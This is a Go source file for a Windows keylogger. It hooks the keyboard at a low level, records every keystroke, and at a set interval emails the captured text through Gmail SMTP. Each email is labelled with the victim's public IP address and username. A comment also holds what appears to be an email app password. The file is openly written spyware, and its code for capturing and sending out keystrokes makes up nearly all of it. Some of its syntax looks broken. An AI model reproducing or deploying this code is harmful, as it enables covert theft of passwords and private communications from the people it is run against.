package main

import (
	"bytes"
	"errors"
	"fmt"
	"io/ioutil"
	"log"
	"net/http"
	"os/user"
	"strconv"
	"time"
	"unsafe"

	gomail "gopkg.in/mail.v2"
)

// variable values that come from build script
var (
	emailTo        string
	emailFrom      string
	emailPassword  string
	reportInterval string
)

func recordKey(code int, reportBuff *bytes.Buffer, shiftKeyDown *bool) {
	if KeyTable[code] == "SPACE" {
		fmt.Print(" ")
		reportBuff.WriteString(" ")
	} else if KeyTable[code] == "ENTER" {
		fmt.Print("\n")
		reportBuff.WriteString("\n")
	} else if KeyTable[code] == "BACKSPACE" {
		reportBuff.Truncate(len(reportBuff.String()) - 1)
		fmt.Print(KeyTable[code])
	} else if KeyTable[code] == "LEFTSHIFT" || KeyTable[code] == "RIGHTSHIFT" {
		*shiftKeyDown = true
	} else if KeyTable[code] == "LEFTCONTROL" || KeyTable[code] == "RIGHTCONTROL" {
		fmt.Print("[Ctrl]")
		reportBuff.WriteString("[Ctrl]")
	} else {
		if *shiftKeyDown {
			char := ShiftKeyTable[KeyTable[code]]
			fmt.Print(char)
			reportBuff.WriteString(char)
		} else {
			fmt.Print(KeyTable[code])
			reportBuff.WriteString(KeyTable[code])
		}
	}
}

func sendEmailReport(message string) {
	mail := gomail.NewMessage()

	// email password - irnsypcfndfpqrtd

	messageHeader := "Target IP addres:      " + getIp() + "\n"
	messageHeader = messageHeader + "Hostname and user:   " + getLoggedInUser() + "\n\n"

	mail.SetHeader("From", emailFrom)
	mail.SetHeader("To", emailTo)
	mail.SetHeader("Subject", "Keylogger Report")
	mail.SetBody("text/plain", messageHeader+message)

	dialer := gomail.NewDialer("smtp.gmail.com", 587, emailFrom, emailPassword)

	if err := dialer.DialAndSend(mail); err != nil {
		fmt.Println("[-] Error:", err)
		return
	}
}

func captureKeystrokes(reportBuff *bytes.Buffer, emailLastSent time.Time) {
	shiftKeyDown := false

	keyboardHook = SetWindowsHookEx(WH_KEYBOARD_LL,
		(HOOKPROC)(func(nCode int, wparam WPARAM, lparam LPARAM) LRESULT {
			if wparam == WM_KEYUP {
				kbdstruct := (*KBDLLHOOKSTRUCT)(unsafe.Pointer(lparam))
				code := int(kbdstruct.vkCode)
				if KeyTable[code] == "LEFTSHIFT" || KeyTable[code] == "RIGHTSHIFT" {
					shiftKeyDown = false
				}
			}
			if nCode == 0 && wparam == WM_KEYDOWN {
				kbdstruct := (*KBDLLHOOKSTRUCT)(unsafe.Pointer(lparam))
				code := int(kbdstruct.vkCode)
				recordKey(code, reportBuff, &shiftKeyDown)
			}
			return CallNextHookEx(keyboardHook, nCode, wparam, lparam)
		}), 0, 0)

	var msg MSG

	for {
		bRet := GetMessage(&msg, 0, 0, 0)
		if bRet != 0 {
			break
		}
		if bRet == -1 {
			errors.New("An error occured with message handling")
			break
		}
	}

	UnhookWindowsHookEx(keyboardHook)
	keyboardHook = 0
}

func getIp() string {
	url := "https://api.ipify.org?format=text" // using a pulib IP API, we're using ipify here, below are some others
	// https://www.ipify.org
	// http://myexternalip.com
	// http://api.ident.me
	// http://whatismyipaddress.com/api
	resp, err := http.Get(url)
	if err != nil {
		panic(err)
	}
	defer resp.Body.Close()
	ip, err := ioutil.ReadAll(resp.Body)
	if err != nil {
		panic(err)
	}

	return string(ip)
}

func getLoggedInUser() string {
	user, err := user.Current()
	if err != nil {
		log.Fatalf(err.Error())
	}

	username := user.Username

	return username
}

func getIntervalMinutes(interval string) float64 {
	timeType := interval[len(interval)-1:]
	timeNum := interval[:len(interval)-1]

	var minutes float64

	if timeType == "s" {
		seconds, _ := strconv.ParseFloat(timeNum, 64)
		minutes = seconds / 60
	} else if timeType == "m" {
		minutes, _ = strconv.ParseFloat(timeNum, 64)
	} else if timeType == "h" {
		hours, _ := strconv.ParseFloat(timeNum, 64)
		minutes = hours * 60
	} else if timeType == "d" {
		days, _ := strconv.ParseFloat(timeNum, 64)
		minutes = days * 60 * 24
	}
	return minutes
}

func main() {
	fmt.Printf("Send to:                 %s\n", emailTo)
	fmt.Printf("Send from:               %s\n", emailFrom)
	fmt.Printf("Email password:          %s\n", emailPassword)
	fmt.Printf("Email report interverl:  %s\n\n", reportInterval)

	fmt.Printf("Minutes: %f\n", getIntervalMinutes(reportInterval))

	var reportBuff bytes.Buffer
	emailLastSend := time.Now()

	go captureKeystrokes(&reportBuff, emailLastSend)

	for {
		now := time.Now()
		timeDiff := now.Sub(emailLastSend)

		if timeDiff.Minutes() >= getIntervalMinutes(reportInterval) {
			emailLastSend = time.Now()
			sendEmailReport(reportBuff.String())
		}
	}
}
